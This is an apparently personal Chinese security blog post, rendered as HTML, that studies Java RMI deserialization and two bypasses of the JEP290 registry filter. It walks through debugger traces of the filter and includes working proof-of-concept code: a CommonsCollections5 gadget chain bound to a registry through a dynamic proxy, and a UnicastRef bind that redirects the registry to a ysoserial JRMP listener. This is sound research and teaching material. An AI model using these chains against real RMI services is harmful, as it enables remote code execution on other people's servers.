@@ -1,0 +1,898 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/bb.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="	#ADD8E6">
+  <meta name="author" content="bxhhf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一.简述&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;JEP290&lt;&#x2F;font&gt;过滤传入的序列化数据。 JEP290 &lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;是 Java 为了防御反序列化攻击而设置的一种过滤器。&lt;&#x2F;font&gt;（JDK">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JEP290 Bypass">
+<meta property="og:url" content="https://bxhhf.github.io/2025/09/23/yuque-hexo-post/JEP290%20Bypass/index.html">
+<meta property="og:site_name" content="bxhhf">
+<meta property="og:description" content="一.简述&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;JEP290&lt;&#x2F;font&gt;过滤传入的序列化数据。 JEP290 &lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;是 Java 为了防御反序列化攻击而设置的一种过滤器。&lt;&#x2F;font&gt;（JDK">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bxhhf.github.io/img/h.png">
+<meta property="article:published_time" content="2025-09-23T14:13:16.000Z">
+<meta property="article:modified_time" content="2025-10-29T01:46:50.941Z">
+<meta property="article:author" content="bxhhf">
+<meta property="article:tag" content="RMI">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bxhhf.github.io/img/h.png">
+  
+  
+  
+  <title>JEP290 Bypass - bxhhf</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_3846514_kabxni94auf.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/sign.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bxhhf.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"enable":true,"app_id":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","app_key":"gbgqDB024hr2I7jmwbO6Mz2a","server_url":"https://an6azuya.lc-cn-n1-shared.com","enable_sync":false,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://registry.npmmirror.com/lxgw-wenkai-screen-web/latest/files/style.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">bxhhf&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/17.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JEP290 Bypass"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-23 22:13" pubdate>
+          2025年9月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JEP290 Bypass</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一-简述"><a href="#一-简述" class="headerlink" title="一.简述"></a>一.简述</h1><p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;JEP290&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.86);">过滤传入的序列化数据。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.86);">JEP290 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.86);&quot;&gt;是 Java 为了防御反序列化攻击而设置的一种过滤器。&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.86);">（</font><font style="color:rgb(26, 26, 26);">JDK6u141、JDK7u131、JDK 8u121 支持 JEP290</font><font style="color:rgba(0, 0, 0, 0.86);">）</font></p>
+<p><font style="color:rgb(26, 26, 26);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.86);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.86);">前面学了 6 种攻击，JEP290 在 RegistryImpl 中添加过滤方法，所以只对注册中心的攻击有影响。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.86);">服务端攻击注册中心这里用了 CC5 加动态代理(因为 bind 绑定的必须是 Remote，需要借助 proxy 动态代理)</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example;<br><br>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;<br>import org.apache.commons.collections.map.TransformedMap;<br><br>import javax.management.BadAttributeValueExpException;<br>import java.lang.annotation.Target;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.Field;<br>import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br>import java.rmi.Remote;<br>import java.rmi.registry.LocateRegistry;<br>import java.rmi.registry.Registry;<br>import java.util.HashMap;<br>import java.util.Map;<br><br>public class RMIServer &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        try &#123;<br><br>            Transformer[] transformers = new Transformer[]&#123;<br>                    new ConstantTransformer(Runtime.class),<br>                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),<br>                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),<br>                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),<br>            &#125;;<br>            Transformer transformer = new ChainedTransformer(transformers);<br>            Map innerMap = new HashMap();<br>            Map ouputMap = LazyMap.decorate(innerMap, transformer);<br><br>            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, &quot;pwn&quot;);<br>            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);<br><br>            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);<br>            field.setAccessible(true);<br>            field.set(badAttributeValueExpException, tiedMapEntry);<br><br>            Map tmpMap = new HashMap();<br>            tmpMap.put(&quot;pwn&quot;, badAttributeValueExpException);<br>            Constructor&lt;?&gt; ctor = null;<br>            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);<br>            ctor.setAccessible(true);<br>            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);<br>            Remote remote = Remote.class.cast(Proxy.newProxyInstance(RMIServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));<br>            Registry registry = LocateRegistry.getRegistry(1099);<br>            registry.bind(&quot;hello1&quot;, remote);<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(26, 26, 26);"></font></p>
+<p><font style="color:rgb(26, 26, 26);">服务端 bind 攻击注册中心,换用 jdk8u131 后继续攻击注册中心会报错：信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 8, depth: 2, bytes: 284, ex: n&#x2F;a</font></p>
+<p><font style="color:rgb(26, 26, 26);">bind 绑定的是 proxy 创建的恶意对象，注册中心反序列化的时候就会阻拦</font></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757904407609-7fc26a5c-762b-470e-9c35-bccd26f51943.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:rgb(26, 26, 26);"></font></p>
+<p><font style="color:rgb(26, 26, 26);"></font></p>
+<h1 id="二-过滤分析"><a href="#二-过滤分析" class="headerlink" title="二.过滤分析"></a><font style="color:rgb(26, 26, 26);">二.过滤分析</font></h1><p><font style="color:rgba(0, 0, 0, 0.86);">报错原因进行分析：</font></p>
+<p><font style="color:rgb(26, 26, 26);">调试看一下，服务端相当于一个客户端给注册中心发起 bind 请求，注册中心 Registry_Skel.dispatch 进行处理</font></p>
+<p>调用 ObjectInputStream.readObject</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757927861945-abe095c5-8afc-46be-96fe-a482a1d77d94.png" srcset="/img/loading.gif" lazyload></p>
+<p>后续跟进发现进到了下的断点方法 ObjectInputStream.filterCheck</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757928021302-de6b9be3-d3dd-4fd1-ae05-d2c93a943ad1.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面步入到真正的过滤：RegistryImpl#registryFilter</p>
+<p><font style="color:rgba(0, 0, 0, 0.86);">具体的过滤代码：</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.86);">RegistryImpl#registryFilter</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo var0) &#123;<br>    if (registryFilter != null) &#123;<br>        ObjectInputFilter.Status var1 = registryFilter.checkInput(var0);<br>        if (var1 != Status.UNDECIDED) &#123;<br>            return var1;<br>        &#125;<br>    &#125;<br><br>    if (var0.depth() &gt; 20L) &#123;<br>        return Status.REJECTED;<br>    &#125; else &#123;<br>        Class var2 = var0.serialClass();<br>        if (var2 != null) &#123;<br>            if (!var2.isArray()) &#123;<br>                return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;<br>            &#125; else &#123;<br>                return var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; 1000000L ? Status.REJECTED : Status.UNDECIDED;<br>            &#125;<br>        &#125; else &#123;<br>            return Status.UNDECIDED;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.86);">加了白名单限制，不在白名单就会返回 Status.REJECTED ：</font></p>
+<ul>
+<li><font style="color:rgb(26, 26, 26);">String.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">Number.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">Remote.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">Proxy.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">UnicastRef.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">RMIClientSocketFactory.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">RMIServerSocketFactory.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">ActivationID.class</font></li>
+<li><font style="color:rgb(26, 26, 26);">UID.class</font></li>
+</ul>
+<p>这里是一层一层进行检验，最外层是我们用的动态代理创建的 remote，和之后的 Proxy 都在白名单内 status 返回值为 ALLOWED</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757929343958-25a8b30e-42b0-4468-851d-bb56a7ca2d98.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757930377467-12da8092-1a90-4370-ab90-6dca63673b5c.png" srcset="/img/loading.gif" lazyload></p>
+<p>但到 AnnotationHandler 时会被拦截 status 返回值为 REJECTED 所以报错</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757930976908-b9993a05-d1d0-444a-a978-09eb29e94d77.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1757931164814-66af37a9-b323-4aa3-9ec5-8cc20d0aac3d.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="三-绕过（8u121-8u231）"><a href="#三-绕过（8u121-8u231）" class="headerlink" title="三. 绕过（8u121~8u231）"></a>三. 绕过（8u121~8u231）</h1><p>UnicastRef Bypass JEP290（8u121&lt;jdk&lt;8u231）</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>绕过原理先看总结：</p>
+<ol>
+<li>首先用的都是白名单里的类所以 check 都能通过，bind 一个 UnicastRef 的对象</li>
+<li>RegistryImpl_Skel 分发处理 bind 进行反序列化，然后会<strong>触发 DGC 逻辑</strong>，就会执行 dirty，向在 UnicastRef 中封装的恶意端发起请求，该过程中底层与之前在 RMI 基础中跟的 DGCImpl_Stub.dirty 一样<ol>
+<li>该方法里调了 super.ref.newCall ,super.ref.invoke()—&gt;StreamRemoteCall.executeCall 对于返回一定条件会直接反序列化，造成反序列化漏洞</li>
+</ol>
+</li>
+</ol>
+<p>也可以说注册中心反序列化 UnicastRef 之后，它就可以看作一个<strong>JRMP 客户端</strong>，向恶意服务端端发起 dirty 请求建立一个<strong>JRMP 连接</strong>到用 ysoserial 开启的 JRMP 服务端，这样就类似于一个服务端攻击客户端了</p>
+<blockquote>
+<p><font style="color:rgb(102, 102, 102);">JEP290 默认只为</font><strong><font style="color:rgb(102, 102, 102);">RMI 注册表</font></strong><font style="color:rgb(102, 102, 102);">和</font><strong><font style="color:rgb(102, 102, 102);">RMI 分布式垃圾收集器</font></strong><font style="color:rgb(102, 102, 102);">（DGC 层）提供了相应的内置过滤器，但是最底层的 JRMP 是没有做过滤器的。</font></p>
+</blockquote>
+<blockquote>
+<p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">无论 RMI Registry、RMI Client、RMI Server、DGCClient 的任意两者通信，它们发起 JRMP</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">请求都利用了 UnicastRef 类。</font></p>
+</blockquote>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758033136663-0f66f0c4-0de0-47a6-833e-3053ca413162.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着先看反序列化后怎么触发的 DGC 逻辑：</p>
+<p>通过白名单 check 后进行反序列化，注册中心 UnicastServerRef.dispatch 分发处理，而存在静态 skel，进而转到 Registry_Skel.dispatch 进行处理反序列化—–&gt;DGCClient.makeDirtyCall 调用 dirty</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758006875214-c1f5b5d9-c5f8-4882-bfe3-310400d547c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>dirty 里面就到了网络请求这里，可以看到 ref 就是 LiveRef,里面封装了 TCPEndpoint,有我们设置的恶意监听端，触发 JRMP 后将返回结果直接进行反序列化</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758007135012-7f8e2597-bcfe-4503-b787-c03256e1e47c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758007107515-e6cfb0fb-6460-4c46-85f3-f2c52cfc907a.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用栈：</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758006527768-ac5f6514-42d5-404d-b441-345db8e22c29.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
+<li>用 ysoserial 相当于重构了一个 JRMP 服务端，攻击用的是 cc5</li>
+</ol>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758031053125-47667cfe-f5a9-4d11-ab7c-1a1a685d18fe.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>运行注册中心</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RMIServer &#123;<br>    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;<br>        IRemoteObj remoteObj = new RemoteObjImpl();//创建远程调用对象<br>        Registry r= LocateRegistry.createRegistry(1099);//创建注册中心<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>服务端进行操作 bind 绑定 UnicastRef 对象，这里还是借助了动态代理</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RMIServer &#123;<br>    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException, AlreadyBoundException &#123;<br>        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1099); // rmi start at 2222<br>        ObjID id = new ObjID(new Random().nextInt());<br>        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 3333); // JRMPListener&#x27;s port is 3333<br>        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));<br>        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);<br>        Registry proxy = (Registry) Proxy.newProxyInstance(RMIServer.class.getClassLoader(), new Class[] &#123;<br>                Registry.class<br>        &#125;, obj);<br>        reg.bind(&quot;Hello&quot;,proxy);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758031105224-185bc510-4288-4d61-9998-64c6d5669c2a.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id><a href="#" class="headerlink" title></a><font style="color:rgb(51, 51, 51);"></font></h1><p><font style="color:rgb(51, 51, 51);">四.另外一种绕过 8u231~8u240</font></p>
+<h2 id="修复点"><a href="#修复点" class="headerlink" title="修复点"></a>修复点</h2><p><font style="color:rgb(51, 51, 51);">修复点一：不论哪种方法，注册中心的分发进行反序列化后抛出异常就会消除 ref,就是一个建立新的 JRMP 连接的重要东西</font><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758094656807-3d5d6de5-10d4-4d60-9315-bfc3fdf6f895.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:rgb(51, 51, 51);">而这里抛出异常时必定的：在反序列化之前进行了类型转换，强制类型的 Object 向下转换会报错 ClassCastException</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">var83 = (String)var90.readObject();<br>var88 = (Remote)var90.readObject();<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51, 51, 51);">修复点二：一的修复已经是可以的，第二点还在 DGCImpl_Stub#dirty 里面做了修改，在执行 newCall 发起 JRMP 请求之后设置里一个过滤，才进行 ref.invoke 反序列化解析</font></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758089287179-b9832e5f-4739-4e64-8fe7-3e794cc259dd.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面的绕过是 UnicastRef 类包装了一层，通过递归的形式反序列化，再通过 DGCClient 执行 dirty，<strong>发起 JRMP 请求</strong>，现在的绕过是直接在<strong>反序列化时就触发 JRMP 请求</strong>，进入到 UnicastRef.invoke 解析</p>
+<p>bind 的或者注册中心 dispatch 分发之后反序列化的是一个远程对象的引用，按照 RMI 基础中的分析来讲注册中心相当于一个客户端反序列化后要会将程对象 exportObject 发布出去该过程中就会建立网络连接</p>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>UnicastRemoteObject.readObjet—&gt;UnicastRemoteObject.reexport 该方法中的 ssf 是在 exp 中设置的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void readObject(java.io.ObjectInputStream in)<br>    throws java.io.IOException, java.lang.ClassNotFoundException<br>&#123;<br>    in.defaultReadObject();<br>    reexport();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void reexport() throws RemoteException<br>&#123;<br>    if (csf == null &amp;&amp; ssf == null) &#123;<br>        exportObject((Remote) this, port);<br>    &#125; else &#123;<br>        exportObject((Remote) this, port, csf, ssf);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>继续是重载的 exportObject—-&gt;服务端引用 UnicastServerRef.exportObject</p>
